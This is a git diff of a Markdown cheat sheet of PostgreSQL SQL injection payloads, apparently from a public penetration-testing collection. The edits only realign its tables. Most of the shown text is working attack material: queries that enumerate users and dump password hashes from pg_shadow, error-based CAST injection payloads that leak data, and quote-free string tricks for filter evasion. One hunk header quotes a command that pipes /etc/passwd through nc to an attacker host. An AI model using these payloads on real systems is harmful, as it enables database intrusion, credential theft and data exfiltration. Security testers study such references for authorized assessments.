@@ -36,39 +36,39 @@
 
 ## PostgreSQL Enumeration
 
-| Description            | SQL Query                               |
-| ---------------------- | --------------------------------------- |
-| DBMS version           | `SELECT version()`                      |
-| Database Name          | `SELECT CURRENT_DATABASE()`             |
-| Database Schema        | `SELECT CURRENT_SCHEMA()`               |
-| List PostgreSQL Users  | `SELECT usename FROM pg_user`           |
-| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |
+| Description            | SQL Query                                            |
+| ---------------------- | ---------------------------------------------------- |
+| DBMS version           | `SELECT version()`                                   |
+| Database Name          | `SELECT CURRENT_DATABASE()`                          |
+| Database Schema        | `SELECT CURRENT_SCHEMA()`                            |
+| List PostgreSQL Users  | `SELECT usename FROM pg_user`                        |
+| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow`              |
 | List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
-| Current User           | `SELECT user;`                          |
-| Current User           | `SELECT current_user;`                  |
-| Current User           | `SELECT session_user;`                  |
-| Current User           | `SELECT usename FROM pg_user;`          |
-| Current User           | `SELECT getpgusername();`               |
+| Current User           | `SELECT user;`                                       |
+| Current User           | `SELECT current_user;`                               |
+| Current User           | `SELECT session_user;`                               |
+| Current User           | `SELECT usename FROM pg_user;`                       |
+| Current User           | `SELECT getpgusername();`                            |
 
 ## PostgreSQL Methodology
 
-| Description            | SQL Query                                    |
-| ---------------------- | -------------------------------------------- |
-| List Schemas           | `SELECT DISTINCT(schemaname) FROM pg_tables` |
-| List Databases         | `SELECT datname FROM pg_database`            |
-| List Tables            | `SELECT table_name FROM information_schema.tables` |
-| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
-| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
-| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |
+| Description    | SQL Query                                                                             |
+| -------------- | ------------------------------------------------------------------------------------- |
+| List Schemas   | `SELECT DISTINCT(schemaname) FROM pg_tables`                                          |
+| List Databases | `SELECT datname FROM pg_database`                                                     |
+| List Tables    | `SELECT table_name FROM information_schema.tables`                                    |
+| List Tables    | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
+| List Tables    | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'`                  |
+| List Columns   | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'`    |
 
 ## PostgreSQL Error Based
 
-| Name         | Payload         |
-| ------------ | --------------- |
+| Name | Payload                                                                 |
+| ---- | ----------------------------------------------------------------------- |
 | CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
-| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -` |
-| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
-| CAST | `AND (SELECT version())::int=1 -- -` |
+| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -`    |
+| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -`                         |
+| CAST | `AND (SELECT version())::int=1 -- -`                                    |
 
 ```sql
 CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
@@ -258,10 +258,10 @@ SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 
 PostgreSQL offers several ways to construct string values without using standard single-quoted literals. The `CHR()` function can generate individual characters from their numeric character codes, which can then be combined using the concatenation operator (`||`). PostgreSQL also supports dollar-quoted strings, available since version 8, allowing text to be enclosed between `$$` delimiters without escaping embedded single quotes.
 
-| Payload            | Technique |
-| ------------------ | --------- |
-| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |
-| `SELECT $$NoQuote$$` | Dollar-Quoted String ( >= version 8 PostgreSQL) |
+| Payload                                 | Technique                                       |
+| --------------------------------------- | ----------------------------------------------- |
+| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()`                             |
+| `SELECT $$NoQuote$$`                    | Dollar-Quoted String ( >= version 8 PostgreSQL) |
 
 ## PostgreSQL Privileges
 
